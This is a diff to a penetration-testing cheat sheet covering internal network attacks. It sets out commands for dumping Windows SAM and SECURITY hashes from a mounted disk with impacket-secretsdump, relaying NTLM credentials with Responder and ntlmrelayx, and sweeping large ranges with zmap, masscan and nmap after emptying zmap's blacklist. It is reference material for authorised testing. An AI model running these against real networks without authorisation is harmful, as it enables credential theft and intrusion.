@@ -32,7 +32,9 @@ sudo ifconfig <static_ip>/24 && sudo ip route add default via <gateway_ip>
 Boot from Kali Linux and dump creds
 
 ```bash
-cd SystemRoot%\system32\Config\SAM
+fdisk -l
+mount /dev/<windows_disk> /mnt
+cd /mnt/Windows/system32/Config
 impacket-secretsdump -system SYSTEM -sam SAM -security SECURITY -local
 ```
 > For more details, see next cheatsheet : [Windows Post Exploitation](05-post-exploitation-windows.md)
@@ -45,46 +47,35 @@ impacket-secretsdump -system SYSTEM -sam SAM -security SECURITY -local
 
 Responder + NTLMrelayx
 
-1. First we need to edit  responder.conf :
-
-`vim /usr/share/responder/Responder.conf`
-
 ```bash
-SMB = Off     # Turn this off
-HTTP = Off    # Turn this off
-```
+# 1. First we need to edit  responder.conf :
+sudo vim /usr/share/responder/Responder.conf
+	SMB = Off     # Turn this off
+	HTTP = Off    # Turn this off
 
-2. Then we create a list of targets :
-
-```bash
+# 2. Then we create a list of targets :
+## For small range
+crackmapexec smb <targets> --gen-relay-list relaylistOutputFilename.txt
+## For big range
 nmap -T4 -Pn -p 445 --open -oA <outfile> <targets>
 cat *.gnmap | grep -i "open/tcp" | cut -d " " -f2 | sort -u > perim_up_smb.txt
 crackmapexec smb perim_up_smb.txt --gen-relay-list relaylistOutputFilename.txt
-```
 
-> if the scope is small, scan and generate using only crackmapexec : 
-`crackmapexec smb <targets> --gen-relay-list relaylistOutputFilename.txt`
-
-3. After we can run Responder + ntlmrelayx
-
-- 1st shell :
-```bash
+# 3. After we can run ntlmrelayx
 impacket-ntlmrelayx -tf relaylistOutputFilename.txt -smb2support
-```
 
-- 2nd shell :
-```bash
-# Light
+# 4. Finally, using another shell, we can run Responder
+## Light
 ./Responder.py -I eth0 
-# Medium (enable wpad, netbios domain and wredir suffix queries)
+## Medium (enable wpad, netbios domain and wredir suffix queries)
 ./Responder.py -I eth0 -rdw
-# Full (Force WPAD and ProxyAuth)
+## Full (Force WPAD and ProxyAuth)
 ./Responder.py -I eth0 -rdwFP
 ```
 
-If limited to a Windows system, you can use Inveigh instead of Responder : 
-
+> If limited to a Windows system, you can use Inveigh instead of Responder : 
 - [Inveigh](https://github.com/Kevin-Robertson/Inveigh)
+
 
 mitm6 + NTLMrelayx
 
@@ -107,9 +98,9 @@ Cain.exe (& Abel)
 
 **Port and service scan**
 
-machines discovery from huge networks
+Hosts discovery from huge ranges
 
-1. zmap on a single port (linux and windows)
+zmap on a single port (linux and windows)
 
 ```bash
 sudo apt install zmap && sudo rm /etc/zmap/blacklist.conf && sudo touch /etc/zmap/blacklist.conf
@@ -117,22 +108,17 @@ sudo zmap -p22 10.0.0.0/8 192.168.0.0/16 -o zmap_linux.ips
 sudo zmap -p445 10.0.0.0/8 192.168.0.0/16 -o zmap_windows.ips
 ```
 
-2. masscan on identified ranges
+masscan on identified ranges
 
 ```bash
 cat zmap_*.ips |awk -F. '{print $1"."$2"."$3".0/24"}' |sort -u > masscan_targets.ips
 masscan -iL masscan_targets.ips -p 21,22,23,80,443,445,5985,5986,8080,8443,5900 -oG masscan.grep
 ```
 
-3. nmap on identified hosts
+nmap on identified hosts
 
 ```bash
 nmap -sV --version-all -Pn -sT --top-ports 3000  -iL masscan.grep -oA all_hosts
-```
-
-
-```bash
-nmap --version-all -sV -sC -oA top1000 <hosts>
 nmap --version-all -sV -sC -p- -oA allports <hosts>
 ```
 
@@ -146,7 +132,7 @@ use auxiliary/scanner/http/tomcat_mgr_login
 searchsploit <service_name>
 ```
 
-> For more details, see previous cheatsheet : [External Penetration Testing](01-web-global.md)
+> For more details, see previous cheatsheet : [External Penetration Testing](../external/01-web-global.md)
 
 ---
 
